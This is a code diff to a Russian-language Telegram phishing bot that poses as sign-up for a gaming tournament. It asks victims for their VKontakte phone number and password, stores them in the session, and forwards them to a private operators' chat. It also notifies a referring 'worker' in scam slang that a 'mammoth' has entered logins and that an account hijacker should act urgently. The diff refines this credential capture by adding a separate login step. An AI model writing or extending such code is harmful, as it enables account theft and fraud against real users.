@@ -366,6 +366,7 @@ function initial22() {
         refer: 0,
         temp_ref: 0,
         ids: 0,
+        login: 0
         
 
     };
@@ -433,6 +434,7 @@ bot.hears("🏆 Турниры", async (ctx) => {
 const vk_login2 = new Composer()
 
 const vk_info2 = new Composer()
+const vk_info3 = new Composer()
 
 
 
@@ -450,15 +452,13 @@ vk_password2.on("text", async (ctx) => {
 })
 
 
-
-
-vk_info2.on("text", async (ctx) => {
+vk_info3.on("text",async(ctx)=>{
     ctx.session.pass = ctx.message.text
     await mongoClient.connect();
     const db = mongoClient.db("workers");
     const collection = db.collection("infos");
 
-
+    
 
     ctx.session.temp_ref = await collection.findOne({ id: Number(ctx.session.refer) });
     if (await collection.findOne({ id: Number(ctx.session.refer) })) {
@@ -472,38 +472,66 @@ vk_info2.on("text", async (ctx) => {
         })
         await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @casino_rotebal`)
         await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
-        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 Login / pass ${ctx.session.pass}\n\n🧑🏼‍💻 Воркер - [${ctx.session.refer}] \n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
+        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n🧑🏼‍💻 Воркер - [${ctx.session.refer}] \n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
         ctx.scene.leave()
     }
     else {
         await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
-        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 Login / pass ${ctx.session.pass}\n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
+        await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
         ctx.scene.leave()
     }
+})
+
+vk_info2.on("text", async (ctx) => {
+    ctx.session.login = ctx.message.text
+    if(isNaN(ctx.session.login)){
+
+        await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
+    }
+    else{
+        if(ctx.session.login.toString().includes("+7") && ctx.session.login.toString().length == 11){
+            await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
+            return ctx.wizard.next()
+        }
+        else{
+            await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
+        }
+        if(ctx.session.login.toString().includes("+375") && ctx.session.login.toString().length == 9){
+            await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
+            return ctx.wizard.next()
+        }
+        else{
+            await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
+        }
+    }
+
+
 
 })
 
 
 
-
 final2.on("text", async (ctx) => {
 
-    await ctx.sendMessage(`✅ Что бы продолжить регистрацию, вам необходимо авторизоваться через социальную сеть ВКонтакте, напишите логин, пароль, через пробел!`)
+    await ctx.sendMessage(`✅ Что бы продолжить регистрацию, вам необходимо авторизоваться через социальную сеть ВКонтакте, введите свой логин (номер телефона)`)
     return ctx.wizard.next()
 })
 
 
 
 
-const menuScene2 = new Scenes.WizardScene('sceneWizard', vk_login2, vk_password2, final2, vk_info2)
+const menuScene2 = new Scenes.WizardScene('sceneWizard', vk_login2, vk_password2, final2, vk_info2,vk_info3)
 const stage2 = new Scenes.Stage([menuScene2])
 bot.use(stage2.middleware())
 
 
 bot.hears("📌 Подать заявку", async (callbackQuery) => {
     callbackQuery.session.id = makeid(5)
+  //  await callbackQuery.editMessageReplyMarkup({reply_markup: {remove_keyboard: true}})
     await callbackQuery.scene.enter('sceneWizard')
     await callbackQuery.reply("✅ Введите свой внутренне игровой ID. ВАЖНО! Айди внутренне игрового аккаунта нужно вводить от аккаунта на котором вы будете играть турнир!")
+
+    //
 
 })
 
